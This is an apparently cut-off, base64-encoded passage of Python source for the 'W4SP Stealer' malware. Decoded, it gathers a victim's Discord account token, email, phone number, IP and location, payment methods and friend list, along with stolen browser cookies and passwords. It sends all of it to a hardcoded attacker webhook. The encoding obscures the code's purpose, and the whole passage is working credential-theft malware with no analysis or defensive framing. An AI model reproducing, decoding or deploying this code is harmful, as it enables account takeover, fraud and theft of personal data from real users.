AgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgICAgICAgICAgZWxpZiBmaWxlcyAhPSAnJzoNCiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcykNCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDAgb3Igci5zdGF0dXNfY29kZSA9PSA0MTM6ICMgNDEzID0gREFUQSBUTyBCSUcNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHBhc3MNCmhvb2sgPSAiaHR0cHM6Ly93ZWJob29rLmxld2lzYWt1cmEubW9lL2FwaS93ZWJob29rcy8xMDYwOTI2MzQ5NzkzMDUwNzI1LzExY0lsQjlPdERNdVpieHFBSERuU1Q0THV6UWtSOUN6VHNGdUNZSk1DWW5uczAyOFp5UHZ1cFNzNzZwWWt0TGZxcGlqIg0KDQpkZWYgTG9hZFVybGliKGhvb2ssIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToNCiAgICBmb3IgaSBpbiByYW5nZSg4KToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgaWYgaGVhZGVycyAhPSAnJzoNCiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSkpDQogICAgICAgICAgICAgICAgcmV0dXJuIHINCiAgICAgICAgZXhjZXB0OiANCiAgICAgICAgICAgIHBhc3MNCg0KZGVmIGdsb2JhbEluZm8oKToNCiAgICBpcCA9IGdldGlwKCkNCiAgICB1c2VybmFtZSA9IG9zLmdldGVudigiVVNFUk5BTUUiKQ0KICAgIGlwZGF0YW5vanNvbiA9IHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZ2VvbG9jYXRpb24tZGIuY29tL2pzb25wL3tpcH0iKSkucmVhZCgpLmRlY29kZSgpLnJlcGxhY2UoJ2NhbGxiYWNrKCcsICcnKS5yZXBsYWNlKCd9KScsICd9JykNCiAgICAjIHByaW50KGlwZGF0YW5vanNvbikNCiAgICBpcGRhdGEgPSBsb2FkcyhpcGRhdGFub2pzb24pDQogICAgIyBwcmludCh1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2dlb2xvY2F0aW9uLWRiLmNvbS9qc29ucC97aXB9IikpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICBjb250cnkgPSBpcGRhdGFbImNvdW50cnlfbmFtZSJdDQogICAgY29udHJ5Q29kZSA9IGlwZGF0YVsiY291bnRyeV9jb2RlIl0ubG93ZXIoKQ0KICAgIGdsb2JhbGluZm8gPSBmIjpmbGFnX3tjb250cnlDb2RlfTogIC0gYHt1c2VybmFtZS51cHBlcigpfSB8IHtpcH0gKHtjb250cnl9KWAiDQogICAgIyBwcmludChnbG9iYWxpbmZvKQ0KICAgIHJldHVybiBnbG9iYWxpbmZvDQoNCg0KZGVmIFRydXN0KENvb2tpZXMpOg0KICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0NCiAgICBnbG9iYWwgREVURUNURUQNCiAgICBkYXRhID0gc3RyKENvb2tpZXMpDQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQ0KICAgICMgcHJpbnQobGVuKHRpbSkpDQogICAgaWYgbGVuKHRpbSkgPCAtMToNCiAgICAgICAgREVURUNURUQgPSBUcnVlDQogICAgICAgIHJldHVybiBERVRFQ1RFRA0KICAgIGVsc2U6DQogICAgICAgIERFVEVDVEVEID0gRmFsc2UNCiAgICAgICAgcmV0dXJuIERFVEVDVEVEDQogICAgICAgIA0KZGVmIEdldFVIUUZyaWVuZHModG9rZW4pOg0KICAgIGJhZGdlTGlzdCA9ICBbDQogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQ0KICAgIF0NCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBmcmllbmRsaXN0ID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ni91c2Vycy9AbWUvcmVsYXRpb25zaGlwcyIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgdWhxbGlzdCA9ICcnDQogICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0Og0KICAgICAgICBPd25lZEJhZGdlcyA9ICcnDQogICAgICAgIGZsYWdzID0gZnJpZW5kWyd1c2VyJ11bJ3B1YmxpY19mbGFncyddDQogICAgICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6DQogICAgICAgICAgICBpZiBmbGFncyAvLyBiYWRnZVsiVmFsdWUiXSAhPSAwIGFuZCBmcmllbmRbJ3R5cGUnXSA9PSAxOg0KICAgICAgICAgICAgICAgIGlmIG5vdCAiSG91c2UiIGluIGJhZGdlWyJOYW1lIl06DQogICAgICAgICAgICAgICAgICAgIE93bmVkQmFkZ2VzICs9IGJhZGdlWyJFbW9qaSJdDQogICAgICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdDQogICAgICAgIGlmIE93bmVkQmFkZ2VzICE9ICcnOg0KICAgICAgICAgICAgdWhxbGlzdCArPSBmIntPd25lZEJhZGdlc30gfCB7ZnJpZW5kWyd1c2VyJ11bJ3VzZXJuYW1lJ119I3tmcmllbmRbJ3VzZXInXVsnZGlzY3JpbWluYXRvciddfSAoe2ZyaWVuZFsndXNlciddWydpZCddfSlcbiINCiAgICByZXR1cm4gdWhxbGlzdA0KDQoNCmRlZiBHZXRCaWxsaW5nKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgDQogICAgaWYgYmlsbGluZ2pzb24gPT0gW106IHJldHVybiAiIC0iDQoNCiAgICBiaWxsaW5nID0gIiINCiAgICBmb3IgbWV0aG9kZSBpbiBiaWxsaW5nanNvbjoNCiAgICAgICAgaWYgbWV0aG9kZVsiaW52YWxpZCJdID09IEZhbHNlOg0KICAgICAgICAgICAgaWYgbWV0aG9kZVsidHlwZSJdID09IDE6DQogICAgICAgICAgICAgICAgYmlsbGluZyArPSAiOmNyZWRpdF9jYXJkOiINCiAgICAgICAgICAgIGVsaWYgbWV0aG9kZVsidHlwZSJdID09IDI6DQogICAgICAgICAgICAgICAgYmlsbGluZyArPSAiOnBhcmtpbmc6ICINCg0KICAgIHJldHVybiBiaWxsaW5nDQoNCg0KZGVmIEdldEJhZGdlKGZsYWdzKToNCiAgICBpZiBmbGFncyA9PSAwOiByZXR1cm4gJycNCg0KICAgIE93bmVkQmFkZ2VzID0gJycNCiAgICBiYWRnZUxpc3QgPSAgWw0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzInLCAnVmFsdWUnOiAxNjM4NCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzI6ODc0NzUwODA4NDMwODc0NjY0PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICdWYWx1ZSc6IDUxMiwgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmlsbGlhbmNlJywgJ1ZhbHVlJzogMTI4LCAnRW1vamknOiAiPDpicmlsbGlhbmNlOjg3NDc1MDgwODMzODYwODE5OT4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgJ1ZhbHVlJzogNjQsICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIeXBlU3F1YWRfRXZlbnRzJywgJ1ZhbHVlJzogNCwgJ0Vtb2ppJzogIjw6aHlwZXNxdWFkX2V2ZW50czo4NzQ3NTA4MDg1OTQ0NzcwNTY+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICdWYWx1ZSc6IDIsJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0NCiAgICBdDQogICAgZm9yIGJhZGdlIGluIGJhZGdlTGlzdDoNCiAgICAgICAgaWYgZmxhZ3MgLy8gYmFkZ2VbIlZhbHVlIl0gIT0gMDoNCiAgICAgICAgICAgIE93bmVkQmFkZ2VzICs9IGJhZGdlWyJFbW9qaSJdDQogICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYmFkZ2VbIlZhbHVlIl0NCg0KICAgIHJldHVybiBPd25lZEJhZGdlcw0KDQpkZWYgR2V0VG9rZW5JbmZvKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQoNCiAgICB1c2VyanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIHVzZXJuYW1lID0gdXNlcmpzb25bInVzZXJuYW1lIl0NCiAgICBoYXNodGFnID0gdXNlcmpzb25bImRpc2NyaW1pbmF0b3IiXQ0KICAgIGVtYWlsID0gdXNlcmpzb25bImVtYWlsIl0NCiAgICBpZGQgPSB1c2VyanNvblsiaWQiXQ0KICAgIHBmcCA9IHVzZXJqc29uWyJhdmF0YXIiXQ0KICAgIGZsYWdzID0gdXNlcmpzb25bInB1YmxpY19mbGFncyJdDQogICAgbml0cm8gPSAiIg0KICAgIHBob25lID0gIi0iDQoNCiAgICBpZiAicHJlbWl1bV90eXBlIiBpbiB1c2VyanNvbjogDQogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQ0KICAgICAgICBpZiBuaXRyb3QgPT0gMToNCiAgICAgICAgICAgIG5pdHJvID0gIjw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICINCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoNCiAgICAgICAgICAgIG5pdHJvID0gIjxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIg0KICAgIGlmICJwaG9uZSIgaW4gdXNlcmpzb246IHBob25lID0gZidge3VzZXJqc29uWyJwaG9uZSJdfWAnDQoNCiAgICByZXR1cm4gdXNlcm5hbWUsIGhhc2h0YWcsIGVtYWlsLCBpZGQsIHBmcCwgZmxhZ3MsIG5pdHJvLCBwaG9uZQ0KDQpkZWYgY2hlY2tUb2tlbih0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KICAgIHRyeToNCiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCg0KZGVmIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKToNCiAgICBnbG9iYWwgaG9vaw0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCiAgICB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lID0gR2V0VG9rZW5JbmZvKHRva2VuKQ0KDQogICAgaWYgcGZwID09IE5vbmU6IA0KICAgICAgICBwZnAgPSAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjU5MzE4NDI1MTE4MzE5NS83YzhmNDc2MTIzZDI4ZDEwM2VmZTM4MTU0MzI3NGMyNS5wbmciDQogICAgZWxzZToNCiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9Ig0KDQogICAgYmlsbGluZyA9IEdldEJpbGxpbmcodG9rZW4pDQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykNCiAgICBmcmllbmRzID0gR2V0VUhRRnJpZW5kcyh0b2tlbikNCiAgICBpZiBmcmllbmRzID09ICcnOiBmcmllbmRzID0gIk5vIFJhcmUgRnJpZW5kcyINCiAgICBpZiBub3QgYmlsbGluZzoNCiAgICAgICAgYmFkZ2UsIHBob25lLCBiaWxsaW5nID0gIvCflJIiLCAi8J+UkiIsICLwn5SSIg0KICAgIGlmIG5pdHJvID09ICcnIGFuZCBiYWRnZSA9PSAnJzogbml0cm8gPSAiIC0iDQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6IGYne2dsb2JhbEluZm8oKX0gfCBGb3VuZCBpbiBge3BhdGh9YCcsDQogICAgICAgICJlbWJlZHMiOiBbDQogICAgICAgICAgICB7DQogICAgICAgICAgICAiY29sb3IiOiAxNDQwNjQxMywNCiAgICAgICAgICAgICJmaWVsZHMiOiBbDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6cm9ja2V0OiBUb2tlbjoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7dG9rZW59YFxuW0NsaWNrIHRvIGNvcHldKGh0dHBzOi8vc3VwZXJmdXJyeWNkbi5ubC9jb3B5L3t0b2tlbn0pIg0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6ZW52ZWxvcGU6IEVtYWlsOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYHtlbWFpbH1gIiwNCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOm1vYmlsZV9waG9uZTogUGhvbmU6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7cGhvbmV9IiwNCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmdsb2JlX3dpdGhfbWVyaWRpYW5zOiBJUDoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7Z2V0aXAoKX1gIiwNCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmJlZ2lubmVyOiBCYWRnZXM6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7bml0cm99e2JhZGdlfSIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpjcmVkaXRfY2FyZDogQmlsbGluZzoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntiaWxsaW5nfSIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpjbG93bjogSFEgRnJpZW5kczoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntmcmllbmRzfSIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAVzRTUCBTVEVBTEVSIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgInRodW1ibmFpbCI6IHsNCiAgICAgICAgICAgICAgICAidXJsIjogZiJ7cGZwfSINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIF0sDQogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLA0KICAgICAgICAidXNlcm5hbWUiOiAiVzRTUCBTdGVhbGVyIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICMgdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykpDQogICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykNCg0KZGVmIFJlZm9ybWF0KGxpc3R0KToNCiAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsbGlzdHQpDQogICAgd2hpbGUgImh0dHBzIiBpbiBlOiBlLnJlbW92ZSgiaHR0cHMiKQ0KICAgIHdoaWxlICJjb20iIGluIGU6IGUucmVtb3ZlKCJjb20iKQ0KICAgIHdoaWxlICJuZXQiIGluIGU6IGUucmVtb3ZlKCJuZXQiKQ0KICAgIHJldHVybiBsaXN0KHNldChlKSkNCg0KZGVmIHVwbG9hZChuYW1lLCBsaW5rKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQoNCiAgICBpZiBuYW1lID09ICJ3cGNvb2siOg0KICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpDQogICAgICAgIGlmIGxlbihyYikgPiAxMDAwOiANCiAgICAgICAgICAgIHJycnJyID0gUmVmb3JtYXQoc3RyKGNvb2tpV29yZHMpKQ0KICAgICAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikNCiAgICAgICAgZGF0YSA9IHsNCiAgICAgICAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLA0KICAgICAgICAgICAgImVtYmVkcyI6IFsNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJXNFNQIHwgQ29va2llcyBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiIqKkZvdW5kKio6XG57cmJ9XG5cbioqRGF0YToqKlxuOmNvb2tpZTog4oCiICoqe0Nvb2tpQ291bnR9KiogQ29va2llcyBGb3VuZFxuOmxpbms6IOKAoiBbdzRzcENvb2tpZXMudHh0XSh7bGlua30pIiwNCiAgICAgICAgICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJAVzRTUCBTVEVBTEVSIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIg0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIiwNCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLA0KICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgICAgIH0NCiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgcmV0dXJuDQoNCiAgICBpZiBuYW1lID09ICJ3cHBhc3N3IjoNCiAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBwYXN3V29yZHMpDQogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOiANCiAgICAgICAgICAgIHJyciA9IFJlZm9ybWF0KHN0cihwYXN3V29yZHMpKQ0KICAgICAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnIpDQoNCiAgICAgICAgZGF0YSA9IHsNCiAgICAgICAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLA0KICAgICAgICAgICAgImVtYmVkcyI6IFsNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJXNFNQIHwgUGFzc3dvcmQgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiKipGb3VuZCoqOlxue3JhfVxuXG4qKkRhdGE6KipcbvCflJEg4oCiICoqe1Bhc3N3Q291bnR9KiogUGFzc3dvcmRzIEZvdW5kXG46bGluazog4oCiIFt3NHNwUGFzc3dvcmQudHh0XSh7bGlua30pIiwNCiAgICAgICAgICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJAVzRTUCBTVEVBTEVSIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBw